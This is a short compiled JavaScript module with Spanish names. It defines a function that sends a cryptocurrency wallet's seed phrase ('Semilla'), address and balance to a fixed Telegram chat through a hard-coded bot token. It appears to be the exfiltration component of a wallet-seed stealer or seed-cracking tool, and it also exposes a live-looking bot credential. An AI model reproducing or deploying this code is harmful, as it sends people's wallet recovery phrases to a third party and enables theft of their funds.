"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.enviarMensajeTelegram = void 0;
const node_telegram_bot_api_1 = __importDefault(require("node-telegram-bot-api"));
const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
const bot = new node_telegram_bot_api_1.default(token, { polling: false });
const chatId = "814041563";
const enviarMensajeTelegram = (msj) => {
    const mensaje = `   📢 Semilla: 
                        ${msj.frase}
                        ---------------
                        👛 Wallet_${msj.wallet_de}: 
                        ${msj.direccion}
                        ---------------
                        💰 Saldo: ${msj.saldo}
                        `;
    bot
        .sendMessage(chatId, mensaje)
        .then(() => {
        console.log("Mensaje enviado con éxito 📢");
    })
        .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
    });
};
exports.enviarMensajeTelegram = enviarMensajeTelegram;
